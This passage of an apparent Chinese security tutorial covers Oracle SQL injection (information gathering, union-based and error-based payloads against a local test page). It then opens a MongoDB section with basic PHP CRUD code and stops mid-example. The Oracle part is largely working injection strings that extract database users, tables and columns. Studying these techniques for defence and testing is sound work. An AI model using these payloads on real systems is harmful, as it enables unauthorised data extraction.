- DBA_ALL_TABLES：DBA 用户所拥有的或有访问权限的对象和表
- ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表
- USER_ALL_TABLES：某一用户所拥有的对象和表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>DBA_TABLES &gt;= ALL_TABLES &gt;= USER_TABLES</strong></p>
<h2 id="4-3-信息搜集">4.3 信息搜集</h2>
<p>从现在开始，我们以注入点<code>http://localhost:8080/oracleInject/index?username=admin</code>为例讲解。代码随便写一个jsp网页就行了。</p>
<p><img src="image-20231015104625343.png" alt="image-20231015104625343"></p>
<p>获取数据库版本信息</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost:8080/oracleInject/index?username=admin' union select 1,'a',(SELECT banner FROM v$version WHERE banner LIKE 'Oracle%25') from dual -- +</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015105016112.png" alt="image-20231015105016112"></p>
<p>获取操作系统版本信息</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost:8080/oracleInject/index?username=admin' union select 1,'a',(SELECT banner FROM v$version where banner like 'TNS%25') from dual -- +</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015105053990.png" alt="image-20231015105053990"></p>
<p>获取当前数据库</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost:8080/oracleInject/index?username=admin' union select 1,'a',(SELECT name FROM v$database) from dual -- +</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015105110814.png" alt="image-20231015105110814"></p>
<p>获取数据库用户</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">user</span> <span class="token keyword">FROM</span> dual<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>获取所有数据库用户</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> all_users<span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$<span class="token punctuation">;</span> <span class="token comment">-- 需要高权限</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>获取当前用户权限</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> session_privs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>获取当前用户有权限的所有数据库</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span> owner<span class="token punctuation">,</span> table_name <span class="token keyword">FROM</span> all_tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015105341194.png" alt="image-20231015105341194"></p>
<p>获取表，all_tables类似于MySQL中的information_schema.tables，里面的结构可以自己构造sql语句。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> all_tables<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015105406979.png" alt="image-20231015105406979"></p>
<p>获取字段名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name <span class="token keyword">FROM</span> all_tab_columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015105421077.png" alt="image-20231015105421077"></p>
<p>在Oracle启动时，在 userenv 中存储了一些系统上下文信息，通过 SYS_CONTEXT 函数，我们可以取回相应的参数值。包括当前用户名等等。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> SYS_CONTEXT（<span class="token string">'USERENV'</span>，<span class="token string">'SESSION_USER'</span>） <span class="token keyword">from</span> dual<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>更多可用参数说明可以查阅 Oracle 提供的文档：<a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/B19306_01/server.102/b14200/functions165.htm">SYS_CONTEXT</a></p>
<h2 id="4-4-注入类型">4.4 注入类型</h2>
<h3 id="4-4-1-联合查询">4.4.1 联合查询</h3>
<p>order by 猜字段数量，union select进行查询，<strong>需要注意的是每一个字段都需要对应前面select的数据类型(字符串/数字)</strong>。所以我们一般先使用null字符占位，然后逐位判断每个字段的类型，比如：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost:8080/oracleInject/index?username=admin' union select null,null,null from dual -- 正常</span>
http:<span class="token comment">//localhost:8080/oracleInject/index?username=admin' union select 1,null,null from dual -- 正常说明第一个字段是数字型</span>
http:<span class="token comment">//localhost:8080/oracleInject/index?username=admin' union select 1,2,null from dual -- 第二个字段为数字时错误</span>
http:<span class="token comment">//localhost:8080/oracleInject/index?username=admin' union select 1,'asd',null from dual -- 正常 为字符串 依此类推</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>查数据库版本和用户名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost:8080/oracleInject/index?username=admin' union select 1,(select user from dual),(SELECT banner FROM v$version where banner like 'Oracle%25') from dual -- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>查当前数据库</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost:8080/oracleInject/index?username=admin' union select 1,(SELECT global_name FROM global_name),null from dual -- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>查表，wmsys.wm_concat()等同于MySQL中的group_concat()，在11gr2和12C上已经抛弃，可以用LISTAGG()替代</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost:8080/oracleInject/index?username=admin' union select 1,(select LISTAGG(table_name,',')within group(order by owner)name from all_tables where owner='SYSTEM'),null from dual -- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015111109733.png" alt="image-20231015111109733"></p>
<p>但是LISTAGG()返回的是varchar类型，如果数据表很多会出现字符串长度过长的问题。这个时候可以使用通过字符串截取来进行。</p>
<p>查字段</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost:8080/oracleInject/index?username=admin' union select 1,(select column_name from all_tab_columns where table_name='TEST' and rownum=2),null from dual -- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>有表名字段名出数据就不说了。</p>
<h2 id="4-5-报错注入">4.5 报错注入</h2>
<h3 id="4-5-1-utl-inaddr-get-host-name">4.5.1 utl_inaddr.get_host_name</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> utl_inaddr<span class="token punctuation">.</span>get_host_name<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> dual<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>11g之后，使用此函数的数据库用户需要有访问网络的权限</p>
<h3 id="4-5-2-ctxsys-drithsx-sn">4.5.2 <a target="_blank" rel="noopener" href="http://ctxsys.drithsx.sn">ctxsys.drithsx.sn</a></h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> ctxsys<span class="token punctuation">.</span>drithsx<span class="token punctuation">.</span>sn<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> dual<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>处理文本的函数，参数错误时会报错。</p>
<h3 id="4-5-3-CTXSYS-CTX-REPORT-TOKEN-TYPE">4.5.3 CTXSYS.CTX_REPORT.TOKEN_TYPE</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> CTXSYS<span class="token punctuation">.</span>CTX_REPORT<span class="token punctuation">.</span>TOKEN_TYPE<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> dual<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'123'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="4-5-4-XMLType">4.5.4 XMLType</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost:8080/oracleInject/index?username=admin' and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>注意url编码，如果返回的数据有空格的话，它会自动截断，导致数据不完整，这种情况下先转为 hex，再导出。</p>
<h3 id="4-5-6-dbms-xdb-version-checkin">4.5.6 dbms_xdb_version.checkin</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> dbms_xdb_version<span class="token punctuation">.</span>checkin<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> dual<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="4-5-7-dbms-xdb-version-makeversioned">4.5.7 dbms_xdb_version.makeversioned</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> dbms_xdb_version<span class="token punctuation">.</span>makeversioned<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> dual<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="4-5-8-dbms-xdb-version-uncheckout">4.5.8 dbms_xdb_version.uncheckout</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> dbms_xdb_version<span class="token punctuation">.</span>uncheckout<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> dual<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="4-5-9-dbms-utility-sqlid-to-sqlhash">4.5.9 dbms_utility.sqlid_to_sqlhash</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> dbms_utility<span class="token punctuation">.</span>sqlid_to_sqlhash<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> dual<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="4-5-10-ordsys-ord-dicom-getmappingxpath">4.5.10 ordsys.ord_dicom.getmappingxpath</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> ordsys<span class="token punctuation">.</span>ord_dicom<span class="token punctuation">.</span>getmappingxpath<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> dual<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="4-5-11-UTL-INADDR-get-host-name">4.5.11 UTL_INADDR.get_host_name</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> UTL_INADDR<span class="token punctuation">.</span>get_host_name<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> dual<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="4-5-12-UTL-INADDR-get-host-address">4.5.12 UTL_INADDR.get_host_address</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> UTL_INADDR<span class="token punctuation">.</span>get_host_name<span class="token punctuation">(</span><span class="token string">'~'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> dual<span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'~'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>剩下的参考下面的链接吧，这里只是做个记录</p>
<h1>0x05 MongoDB</h1>
<h2 id="5-1-NoSQL与MongoDB基本概念">5.1 NoSQL与MongoDB基本概念</h2>
<p><strong>NoSQL</strong></p>
<p>NoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。</p>
<p>NoSQL用于超大规模数据的存储。（例如谷歌或Facebook每天为他们的用户收集万亿比特的数据）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。</p>
<p><strong>NoSQL 数据库分类</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">类型</th>
<th style="text-align:left">部分代表</th>
<th style="text-align:left">特点</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">列存储</td>
<td style="text-align:left">HbaseCassandraHypertable</td>
<td style="text-align:left">顾名思义，是按列存储数据的。最大的特点是方便存储结构化和半结构化数据，方便做数据压缩，对针对某一列或者某几列的查询有非常大的IO优势。</td>
</tr>
<tr>
<td style="text-align:left">文档存储</td>
<td style="text-align:left">MongoDBCouchDB</td>
<td style="text-align:left">文档存储一般用类似json的格式存储，存储的内容是文档型的。这样也就有机会对某些字段建立索引，实现关系数据库的某些功能。</td>
</tr>
<tr>
<td style="text-align:left">key-value存储</td>
<td style="text-align:left">Tokyo Cabinet / TyrantBerkeley DBMemcacheDBRedis</td>
<td style="text-align:left">可以通过key快速查询到其value。一般来说，存储不管value的格式，照单全收。（Redis包含了其他功能）</td>
</tr>
<tr>
<td style="text-align:left">图存储</td>
<td style="text-align:left">Neo4JFlockDB</td>
<td style="text-align:left">图形关系的最佳存储。使用传统关系数据库来解决的话性能低下，而且设计使用不方便。</td>
</tr>
<tr>
<td style="text-align:left">对象存储</td>
<td style="text-align:left">db4oVersant</td>
<td style="text-align:left">通过类似面向对象语言的语法操作数据库，通过对象的方式存取数据。</td>
</tr>
<tr>
<td style="text-align:left">xml数据库</td>
<td style="text-align:left">Berkeley DB XMLBaseX</td>
<td style="text-align:left">高效的存储XML数据，并支持XML的内部查询语法，比如XQuery,Xpath。</td>
</tr>
</tbody>
</table>
<p><strong>MongoDB</strong></p>
<p>MongoDB属于NoSQL数据库的一种，是由C++语言编写的一个基于分布式文件存储的开源数据库系统，旨在为Web应用提供可扩展的高性能数据存储解决方案。在高负载的情况下，添加更多的节点，可以保证服务器性能。</p>
<p>MongoDB 将数据存储为一个文档，数据结构由键值(key=&gt;value)对组成。<strong>MongoDB 文档类似于 JSON 对象</strong>。字段值可以包含其他文档，数组及文档数组。</p>
<p><strong>MongoDB概念解析</strong></p>
<p>和关系型数据库的相关概念不一样，在MongoDB中基本的概念是文档、集合、数据库，如下表：</p>
<table>
<thead>
<tr>
<th style="text-align:left">SQL术语/概念</th>
<th style="text-align:left">MongoDB术语/概念</th>
<th style="text-align:left">解释/说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">database</td>
<td style="text-align:left">database</td>
<td style="text-align:left">数据库</td>
</tr>
<tr>
<td style="text-align:left">table</td>
<td style="text-align:left">collection</td>
<td style="text-align:left">数据库表/集合</td>
</tr>
<tr>
<td style="text-align:left">row</td>
<td style="text-align:left">document</td>
<td style="text-align:left">数据记录行/文档</td>
</tr>
<tr>
<td style="text-align:left">column</td>
<td style="text-align:left">field</td>
<td style="text-align:left">数据字段/域</td>
</tr>
<tr>
<td style="text-align:left">index</td>
<td style="text-align:left">index</td>
<td style="text-align:left">索引</td>
</tr>
<tr>
<td style="text-align:left">table joins</td>
<td style="text-align:left"></td>
<td style="text-align:left">表连接,MongoDB不支持</td>
</tr>
<tr>
<td style="text-align:left">primary key</td>
<td style="text-align:left">primary key</td>
<td style="text-align:left">主键,MongoDB自动将_id字段设置为主键</td>
</tr>
</tbody>
</table>
<h2 id="5-2-PHP操作MongoDB">5.2 PHP操作MongoDB</h2>
<p>PHP下操作MongoDB大致分为两种方式，对应有不同的注入攻击方式。</p>
<h3 id="5-2-1-使用MongoDB类中相应的方法">5.2.1 使用MongoDB类中相应的方法</h3>
<p>使用的Demo大致如下，此时传递进入的参数是一个数组：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$mongo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token variable">$mongo</span><span class="token operator">-&gt;</span><span class="token property">myinfo</span><span class="token punctuation">;</span> <span class="token comment">//选择数据库</span>
<span class="token variable">$coll</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">;</span> <span class="token comment">//选择集合</span>
<span class="token variable">$coll</span><span class="token operator">-&gt;</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//增</span>
<span class="token variable">$coll</span><span class="token operator">-&gt;</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//查</span>
<span class="token variable">$coll</span><span class="token operator">-&gt;</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//减</span>
<span class="token variable">$coll</span><span class="token operator">-&gt;</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//改</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>确保连接及选择一个数据库</strong></p>
<p>为了确保正确连接，你需要指定数据库名，如果数据库在MongoDB中不存在，MongoDB会自动创建。</p>
<p>示例代码如下，访问页面会直接返回数据库名test：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 连接默认主机和端口为：mongodb://localhost:27017</span>
<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">;</span> <span class="token comment">// 获取名称为 "test" 的数据库</span>
<span class="token keyword">echo</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="1-创建集合">1. 创建集合</h4>
<p>创建集合的代码片段如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 连接</span>
<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">;</span> <span class="token comment">// 获取名称为 "test" 的数据库</span>
<span class="token variable">$collection</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">createCollection</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Mi1k"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"集合创建成功："</span><span class="token operator">.</span><span class="token variable">$collection</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在数据库中确认确实创建成功：</p>
<p><img src="image-20231015113802968.png" alt="image-20231015113802968"></p>
<h4 id="2-插入文档">2. 插入文档</h4>
<p>在MongoDB中使用insert()方法插入文档，代码片段如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 连接到mongodb</span>
<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">;</span>            <span class="token comment">// 选择一个数据库</span>
<span class="token variable">$collection</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token property">Mi1k</span><span class="token punctuation">;</span> <span class="token comment">// 选择集合</span>
<span class="token variable">$document</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span> 
    <span class="token string double-quoted-string">"title"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"Hello"</span><span class="token punctuation">,</span> 
    <span class="token string double-quoted-string">"description"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"Just a test."</span><span class="token punctuation">,</span> 
    <span class="token string double-quoted-string">"likes"</span> <span class="token operator">=&gt;</span> <span class="token number">100</span><span class="token punctuation">,</span>
    <span class="token string double-quoted-string">"url"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"https://www.mi1k7ea.com/"</span><span class="token punctuation">,</span>
    <span class="token string double-quoted-string">"by"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"mi1k7ea"</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$collection</span><span class="token operator">-&gt;</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token variable">$document</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"数据插入成功"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>插入成功后，到数据库中确认，这里pretty()方法以格式化的方式来显示所有文档。：</p>
<p><img src="image-20231015113824293.png" alt="image-20231015113824293"></p>
<h4 id="3-查找文档">3. 查找文档</h4>
<p>使用find()方法来读取集合中的文档，代码片段如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 连接到mongodb</span>
<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">;</span>            <span class="token comment">// 选择一个数据库</span>
<span class="token variable">$collection</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token property">Mi1k</span><span class="token punctuation">;</span> <span class="token comment">// 选择集合</span>

<span class="token variable">$cursor</span> <span class="token operator">=</span> <span class="token variable">$collection</span><span class="token operator">-&gt;</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 迭代显示文档标题</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$cursor</span> <span class="token keyword">as</span> <span class="token variable">$document</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token variable">$document</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"title"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>访问即可看到查询的标题：</p>
<p><img src="image-20231015113904280.png" alt="image-20231015113904280"></p>
<h4 id="4-更新文档">4. 更新文档</h4>
<p>使用update()方法来更新文档，代码片段如下，将标题内容从Hello改为World：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 连接到mongodb</span>
<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">;</span>            <span class="token comment">// 选择一个数据库</span>
<span class="token variable">$collection</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token property">Mi1k</span><span class="token punctuation">;</span> <span class="token comment">// 选择集合</span>
<span class="token comment">// 更新文档</span>
<span class="token variable">$collection</span><span class="token operator">-&gt;</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"title"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$set'</span><span class="token operator">=&gt;</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"title"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"World"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 显示更新后的文档</span>
<span class="token variable">$cursor</span> <span class="token operator">=</span> <span class="token variable">$collection</span><span class="token operator">-&gt;</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 循环显示文档标题</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$cursor</span> <span class="token keyword">as</span> <span class="token variable">$document</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token variable">$document</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"title"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>修改后显示改后的标题内容，客户端确认是修改了：</p>
<p><img src="image-20231015113934648.png" alt="image-20231015113934648"></p>
<h4 id="5-删除文档">5. 删除文档</h4>
<p>使用remove()方法来删除文档。</p>
<p>代码片段如下，将移除’title’为’World’的一条数据记录：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 连接到mongodb</span>
<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">;</span>            <span class="token comment">// 选择一个数据库</span>
<span class="token variable">$collection</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token property">Mi1k</span><span class="token punctuation">;</span> <span class="token comment">// 选择集合</span>
   
<span class="token comment">// 移除文档</span>
